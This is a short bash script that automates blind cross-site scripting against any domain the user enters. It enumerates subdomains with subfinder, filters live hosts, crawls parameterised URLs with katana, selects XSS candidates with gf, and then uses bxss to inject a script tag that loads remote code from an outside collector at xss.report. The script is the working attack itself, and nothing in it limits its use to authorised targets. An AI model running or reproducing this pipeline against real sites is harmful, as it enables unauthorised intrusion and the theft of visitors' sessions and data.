#!/bin/bash

# Function to remove the domain suffix from the website name
get_folder_name() {
    local url="$1"
    # Remove the domain suffix (e.g., '.com', '.edu')
    echo "${url%%.*}"
}

# Read website URL from user
read -p "Enter the website URL (e.g., example.com): " website

# Get folder name
folder_name=$(get_folder_name "$website")

# Create the directory if it doesn't exist
mkdir -p "$folder_name"

# Define file paths
subdomains_file="$folder_name/subdomains.txt"
alive_subdomains_file="$folder_name/alive_subdomains.txt"
potential_urls_file="$folder_name/potential_urls.txt"
potential_xss_file="$folder_name/potential_xss_urls.txt"

# Discover subdomains
subfinder -d "$website" > "$subdomains_file"

# Filter live subdomains
httpx-toolkit -silent < "$subdomains_file" > "$alive_subdomains_file"

# Crawl URLs with parameters
katana -u "$alive_subdomains_file" -ps -f qurl > "$potential_urls_file"

# Filter URLs for potential XSS
gf xss < "$potential_urls_file" > "$potential_xss_file"

# Inject the XSS payload
bxss -appendMode -payload "<script src=https://xss.report/c/snowyowl></script>" < "$potential_xss_file"

